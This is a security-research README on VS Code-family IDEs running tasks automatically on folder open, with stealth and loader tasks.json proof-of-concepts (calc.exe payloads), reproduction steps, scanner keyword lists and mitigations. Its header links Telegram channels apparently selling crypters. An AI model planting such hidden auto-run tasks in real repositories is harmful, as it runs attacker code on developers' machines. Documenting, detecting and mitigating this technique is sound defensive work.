# ⚡ IDE Folder-Open RCE: Automatic Task Execution Vulnerability

[![Affected: VS Code](https://img.shields.io/badge/Affected-VS%20Code-blue?logo=visualstudiocode)](https://code.visualstudio.com/)
[![Affected: Cursor](https://img.shields.io/badge/Affected-Cursor-purple)](https://cursor.sh/)
[![Affected: Windsurf](https://img.shields.io/badge/Affected-Windsurf-teal)](https://codeium.com/windsurf)
[![Affected: Kiro](https://img.shields.io/badge/Affected-Kiro%20(AWS)-orange)](https://kiro.dev/)
[![Affected: Antigravity](https://img.shields.io/badge/Affected-Antigravity%20(Google)-4285F4)](https://idx.google.com/)
[![Severity: High](https://img.shields.io/badge/Severity-High-red)]()
[![MITRE ATT&CK: T1204.001](https://img.shields.io/badge/MITRE-T1204.001-orange)](https://attack.mitre.org/techniques/T1204/001/)
[![Purpose: Educational](https://img.shields.io/badge/Purpose-Educational%20%2F%20Defensive-green)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)

<div align="center">

### 🔐 Brought to you by [Kurtz](https://t.me/accusable)
*Advanced cryptography and security solutions*

[![Telegram Channel](https://img.shields.io/badge/Telegram-Channel-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/CrypterCC) [![Telegram Chat](https://img.shields.io/badge/Telegram-Chat-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](http://t.me/+cqqW4Z9PcP9kODE0) [![Reviews & Vouches](https://img.shields.io/badge/Reviews_%26_Vouches-Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/CCVouchesReviews)

</div>

---

> **A trusted workspace configuration file can execute arbitrary commands the moment you open a folder. No prompts. No warnings. No interaction required.**

---

## 📋 Table of Contents

- [Summary](#-summary)
- [Affected Software](#-affected-software)
- [How It Works](#-how-it-works)
- [Attack Variants](#-attack-variants)
- [Real-World Usage](#-real-world-usage)
- [Impact Assessment](#-impact-assessment)
- [Reproduction Steps](#-reproduction-steps)
- [Detection Methods](#-detection-methods)
- [Mitigation](#-mitigation)
- [Are You Vulnerable?](#-are-you-vulnerable)
- [Scanner Tool](#-scanner-tool)
- [FAQ](#-faq)
- [References](#-references)
- [Disclaimer](#%EF%B8%8F-disclaimer)

---

## 🔍 Summary

VS Code and derivative IDEs (Cursor, Windsurf, and other Electron-based editors) support a `tasks.json` workspace configuration that can define tasks to run **automatically when a folder is opened**. By setting `"runOn": "folderOpen"` on a task, an attacker can achieve **arbitrary command execution** the instant a victim opens a malicious repository or project folder in their IDE. The victim does not need to click anything, run any command, or interact with the editor beyond opening the folder. This design feature has been actively exploited in the wild by the Lazarus Group (DPRK) as part of the "Contagious Interview" campaign, targeting developers through trojanized coding challenges and open-source repositories.

---

## 🎯 Affected Software

| IDE | Vulnerable | Notes |
|-----|-----------|-------|
| [**Visual Studio Code**](https://code.visualstudio.com/) | ✅ Yes | Core feature since tasks API v2.0 |
| [**Cursor**](https://cursor.sh/) | ✅ Yes | Inherits VS Code task system |
| [**Windsurf (Codeium)**](https://codeium.com/windsurf) | ✅ Yes | Inherits VS Code task system |
| [**Kiro (AWS)**](https://kiro.dev/) | ✅ Yes | VS Code-based; inherits task system |
| [**Antigravity (Google)**](https://developer.google.com/project-idx) | ✅ Yes | VS Code-based; inherits task system |
| [**VSCodium**](https://vscodium.com/) | ✅ Yes | Open-source VS Code fork |
| [**code-server**](https://github.com/coder/code-server) | ✅ Yes | Browser-based VS Code |
| [**GitHub Codespaces**](https://github.com/features/codespaces) | ⚠️ Varies | May have workspace trust mitigations |
| **Any Electron IDE with VS Code task compat** | ⚠️ Likely | If they implement the tasks.json spec |

**Platforms affected:** Windows, macOS, Linux (all platforms where these IDEs run).

---

## ⚙️ How It Works

### The Task System

VS Code uses `.vscode/tasks.json` to define build tasks, linters, test runners, and other automation. This is a **trusted workspace configuration** that developers routinely include in repositories.

### The Trigger

The `"runOn": "folderOpen"` property tells the IDE to execute a task **automatically** when the workspace is opened:

```
 Developer opens folder
        │
        ▼
 IDE reads .vscode/tasks.json
        │
        ▼
 Finds task with "runOn": "folderOpen"
        │
        ▼
 Executes "command" in shell ← ARBITRARY CODE EXECUTION
        │
        ▼
 Attacker's payload runs with user privileges
```

### Minimal Malicious tasks.json

```jsonc
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "build",
      "type": "shell",
      "command": "calc.exe",        // <-- Arbitrary command
      "runOptions": {
        "runOn": "folderOpen"       // <-- Triggers on folder open
      }
    }
  ]
}
```

### Why This Is Dangerous

1. **No user interaction** — the command runs the instant the folder loads.
2. **Trusted file path** — `.vscode/tasks.json` is a standard config file that developers expect to see in repos.
3. **Easily hidden** — the task can be buried among legitimate build tasks.
4. **Full user privileges** — the command runs as the current user, inheriting all their permissions.
5. **Cross-platform** — different commands can be specified per OS (`windows`, `linux`, `osx` properties).
6. **Stealth options** — the terminal output can be hidden using presentation settings.

---

## 🔪 Attack Variants

### Variant 1: Basic (Direct Execution)

The simplest form. Runs a command directly when the folder opens.

```jsonc
// .vscode/tasks.json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "build",
      "type": "shell",
      "command": "calc.exe",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

**Detection difficulty:** Easy — the command is plainly visible.

See: [`variants/1-basic/`](variants/1-basic/)

---

### Variant 2: Stealth (Hidden Terminal + OS-Specific Payload)

Hides the terminal panel and uses separate OS-specific commands. The `command` field shows a benign `echo`, while the real payload is in the OS-specific override.

```jsonc
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "initialize workspace",
      "type": "shell",
      "command": "echo 'Initializing project...'",
      "windows": {
        "command": "cmd /c start calc.exe"
      },
      "presentation": {
        "reveal": "never",
        "echo": false,
        "focus": false,
        "panel": "shared",
        "close": true
      },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

**Detection difficulty:** Medium — requires checking OS-specific overrides and presentation settings.

See: [`variants/2-stealth/`](variants/2-stealth/)

---

### Variant 3: Loader (Delegated to Script)

The tasks.json calls a legitimate-looking script (e.g., a Python setup file) that contains the actual payload. This adds a layer of indirection that defeats simple tasks.json scanning.

```jsonc
// tasks.json just runs a "setup" script
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup environment",
      "type": "shell",
      "command": "python",
      "args": ["scripts/setup.py"],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

```python
# scripts/setup.py — looks legitimate but contains a payload
import subprocess, platform

def setup_environment():
    """Configure project dependencies."""
    print("Setting up development environment...")
    # ... legitimate-looking code ...
    if platform.system() == "Windows":
        subprocess.Popen(["calc.exe"])  # Payload buried in setup logic
```

**Detection difficulty:** Hard — tasks.json looks benign, payload is in a separate file.

See: [`variants/3-loader/`](variants/3-loader/)

---

## 🌍 Real-World Usage

### Lazarus Group / Contagious Interview Campaign

The North Korean APT group **Lazarus** (tracked as **FAMOUS CHOLLIMA**, **UNC4899**) has weaponized this technique as part of the **"Contagious Interview"** campaign:

- **Target:** Software developers, primarily those applying for jobs or contributing to open-source projects.
- **Method:** Victims receive a "coding challenge" or are directed to clone a trojanized GitHub repository. The repo contains a malicious `.vscode/tasks.json` that executes a payload on folder open.
- **Payload chain:** The initial task typically runs a script that downloads and executes further-stage malware (infostealers, RATs, cryptocurrency wallet drainers).
- **Scale:** Dozens of trojanized npm packages and GitHub repositories have been identified.

### Key Reports

- **Microsoft Threat Intelligence (Feb 2025):** Documented FAMOUS CHOLLIMA using VS Code tasks.json in attacks targeting developers through fake job interviews.
- **Abstract Security:** Detailed analysis of the folderOpen execution mechanism and detection strategies.
- **SecurityJoes / PaloAlto Unit42:** Tracked the broader Contagious Interview campaign infrastructure.

---

## 💥 Impact Assessment

| Factor | Rating |
|--------|--------|
| **Ease of exploitation** | Very Easy — just add a JSON file to a repo |
| **User interaction required** | None — opening the folder is sufficient |
| **Privilege escalation** | Runs as current user (often admin on dev machines) |
| **Stealth potential** | High — terminal can be hidden, payload can be delegated |
| **Affected population** | Millions of VS Code / Cursor / Windsurf users |
| **Active exploitation** | Yes — Lazarus Group / Contagious Interview |

### What an Attacker Can Do

- Execute any command as the current user
- Download and run additional malware
- Exfiltrate source code, credentials, SSH keys, browser data
- Install persistent backdoors
- Pivot to internal networks
- Steal cryptocurrency wallet keys

---

## 🧪 Reproduction Steps

> **IMPORTANT:** These steps use `calc.exe` (Windows Calculator) as a safe, harmless payload. Never test with real malware.

### Quick Test (Variant 1)

1. Create a new folder anywhere on your system:
   ```
   mkdir test-vuln && cd test-vuln
   mkdir .vscode
   ```

2. Create `.vscode/tasks.json` with this content:
   ```json
   {
     "version": "2.0.0",
     "tasks": [
       {
         "label": "build",
         "type": "shell",
         "command": "calc.exe",
         "runOptions": {
           "runOn": "folderOpen"
         }
       }
     ]
   }
   ```

3. Open the folder in VS Code / Cursor / Windsurf:
   ```
   code test-vuln
   ```

4. **Result:** Windows Calculator should open automatically without any user interaction beyond opening the folder.

### If Calculator Does NOT Open

- You may have **Workspace Trust** enabled (VS Code will show a trust prompt).
- Check `Settings > task.allowAutomaticTasks` — if set to `"off"`, auto-tasks are disabled.
- You previously dismissed the auto-task with "Never" for this workspace.

### Testing Other Variants

Use the PoCs in the [`variants/`](variants/) directory. Each one is self-contained — just open the variant folder in your IDE.

---

## 🔎 Detection Methods

### 1. Static File Scanning

Search for `tasks.json` files containing `folderOpen`:

```bash
# Linux/macOS
find /path/to/repos -path '*/.vscode/tasks.json' -exec grep -l 'folderOpen' {} \;

# Windows PowerShell
Get-ChildItem -Path C:\repos -Recurse -Filter tasks.json |
  Where-Object { $_.FullName -match '\.vscode' } |
  Where-Object { (Get-Content $_.FullName -Raw) -match 'folderOpen' }
```

### 2. Use the Included Scanner

This repo includes a scanner that checks for malicious patterns:

```bash
python scanner/scan.py /path/to/check
```

See: [Scanner Tool](#-scanner-tool)

### 3. YARA Rules

Use the included YARA rules for file-level detection:

```
detection/yara_rules.yar
```

### 4. Sigma Rules

Use the included Sigma rule for log-based detection:

```
detection/sigma_rule.yml
```

### 5. Behavioral Monitoring

Monitor for child processes spawned by VS Code / Cursor / Windsurf shell processes, particularly:
- `powershell.exe` or `pwsh.exe` with encoded commands
- `cmd.exe` spawning network utilities
- `python` / `node` running scripts from `.vscode` adjacent paths
- Any process making network connections immediately after IDE launch

---

## 🛡️ Mitigation

### For Individual Users

#### Option 1: Disable Automatic Tasks (Recommended)

In VS Code / Cursor / Windsurf settings (`settings.json`):

```json
{
  "task.allowAutomaticTasks": "off"
}
```

Or via UI: `Settings` > search `task.allowAutomaticTasks` > set to `off`.

#### Option 2: Enable Workspace Trust

Ensure Workspace Trust is enabled (VS Code default):

```json
{
  "security.workspace.trust.enabled": true
}
```

This prompts you before trusting a new workspace. **Do not blindly click "Trust"** when opening unfamiliar repos.

#### Option 3: Review Before Opening

Before opening any cloned repo in your IDE, check for `.vscode/tasks.json`:

```bash
cat .vscode/tasks.json 2>/dev/null || echo "No tasks.json found"
```

### For Organizations

- Deploy the `task.allowAutomaticTasks: "off"` setting via Group Policy or MDM.
- Implement pre-commit hooks that flag `runOn: folderOpen` in tasks.json.
- Add YARA rules to endpoint detection.
- Train developers to recognize this attack vector.
- See: [`mitigations/`](mitigations/) for detailed enterprise guidance.

---

## 🔬 Are You Vulnerable?

Run this quick check:

### Step 1: Check Your Settings

Open your IDE and go to Settings. Search for `task.allowAutomaticTasks`.

| Value | Status |
|-------|--------|
| `"off"` | **Protected** — auto-tasks will not run |
| `"on"` | **Vulnerable** — auto-tasks run without prompt |
| `"prompt"` (default in some versions) | **Partially protected** — you will be asked, but may click through |

### Step 2: Check Workspace Trust

Search for `security.workspace.trust.enabled` in Settings.

| Value | Status |
|-------|--------|
| `true` (default) | **Partially protected** — new folders require trust approval |
| `false` | **Vulnerable** — all folders are trusted automatically |

### Step 3: Use the Scanner

```bash
# Scan your projects directory for existing threats
python scanner/scan.py ~/projects
```

---

## 🔧 Scanner Tool

This repository includes a scanner in both Python and PowerShell.

### Python Scanner

```bash
# Scan a directory recursively
python scanner/scan.py /path/to/scan

# Examples
python scanner/scan.py ~/projects
python scanner/scan.py C:\Users\dev\repos
python scanner/scan.py .
```

The scanner checks for:
- `runOn: folderOpen` triggers
- Suspicious commands (`powershell -EncodedCommand`, `curl`, `wget`, `msiexec`, `Start-Process`, etc.)
- Mismatched `command` vs `windows.command` / `linux.command` / `osx.command` (stealth technique)
- Base64-encoded payloads
- Hidden presentation settings (`reveal: "never"`, `echo: false`)
- Script execution (Python, Node, Bash scripts called by tasks)

Output uses color-coded severity: **SAFE**, **WARNING**, **DANGEROUS**.

### PowerShell Scanner

```powershell
.\scanner\scan.ps1 -Path C:\Users\dev\repos
```

---

## ❓ FAQ

**Q: Is this a bug or a feature?**
A: It is a *feature* — VS Code intentionally supports `runOn: folderOpen` for developer convenience. The security issue is that it enables a low-friction attack vector, especially in contexts where developers routinely clone and open untrusted repositories. Microsoft has added mitigations (Workspace Trust) but the underlying capability remains.

**Q: Does Workspace Trust fully protect me?**
A: Partially. If Workspace Trust is enabled (the default), VS Code will prompt you before trusting a new folder. However, many developers habitually click "Trust" without reviewing workspace configurations, and some users disable Workspace Trust entirely because of the frequent prompts.

**Q: Can this attack be executed through a GitHub PR?**
A: Yes. If a pull request adds or modifies `.vscode/tasks.json` and a reviewer checks out the PR branch and opens it in their IDE, the payload will execute.

**Q: Are VS Code extensions involved?**
A: No. This attack uses only built-in VS Code task functionality. No extensions are required.

**Q: Why calc.exe?**
A: `calc.exe` (Windows Calculator) is the standard benign payload for proof-of-concept demonstrations. It proves code execution without causing any harm. All PoCs in this repository use only calc.exe.

**Q: Can this be used on macOS/Linux?**
A: Yes. The `command` field runs in the system shell. On macOS you could use `open -a Calculator`, on Linux `xcalc` or any other command. The `windows`, `linux`, and `osx` properties allow OS-specific commands in a single tasks.json.

---

## 📚 References

- [Microsoft: FAMOUS CHOLLIMA targets developers with malicious VS Code projects (2025)](https://www.microsoft.com/en-us/security/blog/)
- [Abstract Security: VS Code tasks.json folderOpen Attack Analysis](https://www.abstractsecurity.com/)
- [MITRE ATT&CK T1204.001 — User Execution: Malicious Link](https://attack.mitre.org/techniques/T1204/001/)
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [VS Code Tasks Documentation — runOn property](https://code.visualstudio.com/docs/editor/tasks#_run-behavior)
- [Lazarus Group / Contagious Interview — CISA Advisory](https://www.cisa.gov/)
- [SecurityJoes — Contagious Interview Campaign Analysis](https://www.securityjoes.com/)
- [Unit42 — DPRK IT Workers and Developer Targeting](https://unit42.paloaltonetworks.com/)

---

## ⚖️ Disclaimer

This repository is provided **strictly for educational and defensive security research purposes**. The proof-of-concept demonstrations use only benign payloads (`calc.exe`) and are designed to raise awareness of this attack vector.

- **Do not** use these techniques for unauthorized access to systems.
- **Do not** modify these PoCs to include malicious payloads.
- The authors are not responsible for misuse of this information.
- All techniques documented here are based on publicly known, well-documented attack methods.
- If you discover this vulnerability being exploited in the wild, report it to the affected organization and relevant authorities.

**Responsible Disclosure:** This documents a *known, publicly disclosed* attack technique that has been actively exploited in the wild. Microsoft is aware of this capability and has implemented partial mitigations (Workspace Trust). The purpose of this repository is to help defenders detect and prevent these attacks.

---

## 🤝 Contributing

Contributions are welcome! If you have:
- Additional detection rules (Splunk, ELK, etc.)
- Scanner improvements
- New attack variants discovered in the wild
- Mitigation strategies for other IDEs

Please open an issue or submit a pull request.

---

*Created for the security research community. Stay safe, audit your workspaces.* 🛡️
